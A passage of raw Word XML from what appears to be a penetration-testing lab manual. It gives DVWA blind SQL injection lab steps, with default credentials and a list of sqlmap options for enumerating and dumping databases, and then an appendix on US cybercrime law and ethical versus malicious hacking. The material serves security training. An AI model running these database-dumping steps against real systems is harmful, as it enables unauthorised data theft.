    <w:p w14:paraId="1AA42ECC" w14:textId="77777777" w:rsidR="00F775E3" w:rsidRDefault="00F775E3" w:rsidP="00F775E3">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Browse to the DVWA website via the bookmark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A4180F" w14:textId="77777777" w:rsidR="00F775E3" w:rsidRDefault="00F775E3" w:rsidP="00F775E3">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Login to the DVWA website and click on the “SQL injection (Blind)” panel.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>User:admin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pass:password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293C3891" w14:textId="59C20219" w:rsidR="00F775E3" w:rsidRDefault="00F775E3" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Click the SQL Injection (Blind) on the left side of the page and enter a number (4 for example) into the user id field and click submit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0652CE2C" w14:textId="77777777" w:rsidR="00F775E3" w:rsidRDefault="00F775E3" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31BC2A01" w14:textId="77777777" w:rsidR="00F775E3" w:rsidRDefault="00F775E3" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D4E9C5C" w14:textId="77777777" w:rsidR="00565CE1" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">With these details, we </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>are able to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> construct the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> command.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7B30C1" w14:textId="69EA55E2" w:rsidR="00565CE1" w:rsidRDefault="00565CE1" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Open a command prompt in windows and change to the “c:\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">” directory.  </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">This implementation of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> uses python so you will </w:t>
      </w:r>
      <w:r w:rsidR="00B20576">
        <w:t>use the “sqlmap.py” script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2633AAEC" w14:textId="7ED22CE6" w:rsidR="00CC5DF8" w:rsidRDefault="00CC5DF8" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>You can type “sqlmap</w:t>
      </w:r>
      <w:r w:rsidR="00565CE1">
        <w:t>.py</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>hh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">” for an </w:t>
      </w:r>
      <w:r w:rsidR="001D6BCF">
        <w:t>extended list</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of the options.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D76296" w14:textId="74BE41C9" w:rsidR="00F775E3" w:rsidRDefault="00F775E3" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Some of the options that will be of interest to us include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CAAD74" w14:textId="0CD57DC1" w:rsidR="00CC5DF8" w:rsidRDefault="00F775E3" w:rsidP="00D03617">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>-u (for specifying the URL to test)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">--cookie (for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>specifcing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the session cookie to use)</w:t>
      </w:r>
      <w:r w:rsidR="00B20576">
        <w:br/>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B20576">
        <w:t>dbs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B20576">
        <w:t xml:space="preserve"> (for enume</w:t>
      </w:r>
      <w:r w:rsidR="009A2E75">
        <w:t>rating the databases)</w:t>
      </w:r>
      <w:r w:rsidR="009A2E75">
        <w:br/>
        <w:t>-D &lt;database name&gt; (for specifying a database to work with)</w:t>
      </w:r>
      <w:r w:rsidR="009A2E75">
        <w:br/>
        <w:t>--tables (to provide a list of the tables in the DB)</w:t>
      </w:r>
      <w:r w:rsidR="009A2E75">
        <w:br/>
        <w:t>--columns (provides the DB columns)</w:t>
      </w:r>
      <w:r w:rsidR="009A2E75">
        <w:br/>
        <w:t xml:space="preserve">-dump (will dump the contents of the columns </w:t>
      </w:r>
      <w:r w:rsidR="00B47953">
        <w:t>specified</w:t>
      </w:r>
      <w:r w:rsidR="009A2E75">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00084633">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00084633" w:rsidRPr="001D6BCF">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
        </w:rPr>
        <w:t xml:space="preserve">--proxy </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidR="00084633" w:rsidRPr="001D6BCF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
            <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
          </w:rPr>
          <w:t>http://127.0.0.1:8080</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00084633" w:rsidRPr="001D6BCF">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="999999"/>
        </w:rPr>
        <w:t xml:space="preserve"> (to use a proxy, in this case Burp suite listening on the loopback address of the local machine)</w:t>
      </w:r>
      <w:r w:rsidR="00084633" w:rsidRPr="006C6FD3">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF652E9" w14:textId="434859E8" w:rsidR="00A8684E" w:rsidRDefault="00A8684E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="231F20" w:themeColor="text1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61006775" w14:textId="77777777" w:rsidR="00B47953" w:rsidRDefault="00B47953">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="231F20" w:themeColor="text1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6B500E" w14:textId="59D1CF09" w:rsidR="001835F6" w:rsidRDefault="008E1100" w:rsidP="00720D46">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc487296578"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Appendix A: Cyber Security</w:t>
      </w:r>
      <w:r w:rsidR="008F2D6F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> – A Legal Perspective</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="541664B5" w14:textId="120A7E3C" w:rsidR="008E1100" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Cybercrime Security:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE868D4" w14:textId="31346E82" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008E1100">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r w:rsidRPr="008F2D6F">
        <w:t>Collective processes and mechanisms by which people, sensitive and valuable information, products and services are protected from damage, publication, tampering or collapse by unauthorized activities or untrustworthy individuals and unplanned events respectively. Computer security aims at the protection of persons, information and property from theft, misuse, corruption, tampering, unauthorized disclosure, or natural disaster, while allowing the information and property to remain accessible and productive to its intended users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3623B9F0" w14:textId="39D39DFB" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Background:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A10B6D" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the early 1980s law enforcement agencies faced the dawn of the computer age with growing concern about the lack of criminal laws available to fight emerging computer crimes. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244002E8" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>In response, Congress included in the Comprehensive Crime Control Act (CCCA) of 1984 provisions to address the unauthorized access and use of computers and computer networks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BC3B7F" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Throughout 1985, both the House and the Senate held hearings on potential computer crime bills, continuing the efforts begun the year before. These hearings culminated in the Computer Fraud and Abuse Act (CFAA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F133ED" w14:textId="6EF51845" w:rsidR="001835F6" w:rsidRDefault="001835F6">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="663F7E03">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008F2D6F">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>Current Legal Environment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E0EA94" w14:textId="368E1670" w:rsidR="008F2D6F" w:rsidRPr="00A8684E" w:rsidRDefault="001835F6" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
        <w:ind w:left="432" w:hanging="216"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008F2D6F">
        <w:t xml:space="preserve">The Primary guide in most federal hacking cases in still </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="008F2D6F">
        <w:t>the  Computer</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008F2D6F">
        <w:t xml:space="preserve"> Fraud </w:t>
      </w:r>
      <w:r w:rsidR="008F2D6F" w:rsidRPr="00A8684E">
        <w:t xml:space="preserve">and Abuse Act (CFAA - passed by U.S. Congress in 1986) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C940A0F" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Other federal statutes used for prosecuting Cybercrime are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76529034" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Wiretap Act</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587301EA" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Unlawful Access to Stored Communications Act</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1D64EB" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Identity Theft and Aggravated Identity Theft Act</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B56F54" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Access Device Fraud Act</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7CA8D5" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>CAN-SPAM Act</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2565B984" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Wire Fraud</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8AB107" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Communication Interference Act</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EA99AF" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Other considerations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631695D4" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In addition, most every state has its own Computer Crime Statutes. Each state also has its own prosecutorial system. Some states are much more active </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in the area of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> cybersecurity enforcement than others, but typically the states will cooperate with federal authorities. Some state laws are more restrictive than federal, i.e. in areas such as State Laws Addressing “Phishing” and State Spyware Laws. The laws are a complex web. Only skilled lawyers </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>are capable of figuring</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> out the full meaning revealed in case law interpretations of the state and federal laws.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747EDC40" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Legal vs. Illegal hacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D47537" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Cracker vs Hacker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA1A376" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>A hacker is a person intensely interested in the arcane and recondite workings of any computer operating system. Hackers are most often programmers. As such, hackers obtain advanced knowledge of operating systems and programming languages. They might discover holes within systems and the reasons for such holes. Hackers constantly seek further knowledge, freely share what they have discovered, and never intentionally damage data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A08AF98" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>A cracker is one who breaks into or otherwise violates the system integrity of remote machines with malicious intent. Having gained unauthorized access, crackers destroy vital data, deny legitimate users service, or cause problems for their targets. Crackers can easily be identified because their actions are malicious.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A82252" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Clear Dividing Line</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D394F8D" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Congress needs to enact a clearer, more technologically current law to rationally and fairly divide the line between legal and illegal hacking. The complete rewrite should include different Acts for criminal and civil rules and </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>enforcement, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> should tie into privacy and security legislation. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAD8AB2" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Need a clearer / more dependable way to distinguish between “ethical” and “malicious” hacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAEAA87" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Malicious hacking is always negative and destructive. Ethical hacking’s goal is to contribute to the security community and to improve overall security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD0CB0A" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>White / Grey / Black(cracker) Hat Hacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0A4235" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>All of them exploit weaknesses in computer systems and networks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9AC397" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Black Hat Hackers, computer criminals whose malicious activities serve their own ends ranging from financial gain to simply causing chaos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4E7DFB" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>White Hat (“ethical”) Hackers are usually those that carry out their craft with no apparent criminal intention in mind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4443BF0E" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Grey Hat Hackers sit in the middle, often hacking into a system just to prove they can, but afterwards usually notifying the vendor or owner of the weakness</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760550C0" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>White Hat Hacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F7DFB1" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usually hired by companies to carry out vulnerability assessments and penetration testing, a technique that helps to determine how secure the company’s systems are. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744D7292" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It’s a necessary business service that allows businesses identify their weaknesses and shore up their </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>defences</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> against real criminals (Crackers / Black Hats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A31531C" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Is Ethical Hacking Legal? – It depends!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314E2D9E" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Companies believe that authorizing an ethical hacker to test a company’s </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>defences</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is enough legal protection to justify ethical hacking. Ethical </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Hackers believe they are justified by the fact that they are acting in the best interests of the company who hired them</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F38D513" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>However, what needs to be considered is how far the hacker is willing to go to test the systems. Or worse, to switch into grey hat mode, determined to break in just to prove they can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6253091A" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Ethical hacking pitfalls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26910410" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Often, Ethical Hackers break laws </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> conduct their activities:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24559695" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Obtaining a user’s PII (i.e. social engineering)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027E9186" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Gain access to the system using someone else’s credentials (obtained Illicitly)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA1686B" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Gain access to confidential information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672FA730" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Gain access to customer/employee information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EA040E" w14:textId="1375729A" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Probe / “White Hat”-hack other avenues to the company being tested i.e. access via their business partners. Unless the business partner has been included in the scope of the penetration test, the ethical hacker has strayed outside the boundaries of the law to achieve their aims</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAAA540" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remarks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9268E8" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">“Ethical Hackers” aim to test businesses’ security in a constructive way </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> improve it </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CF7242" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Companies hire ethical hackers because they need to test their security. By granting their permission to the </w:t>
      </w:r>
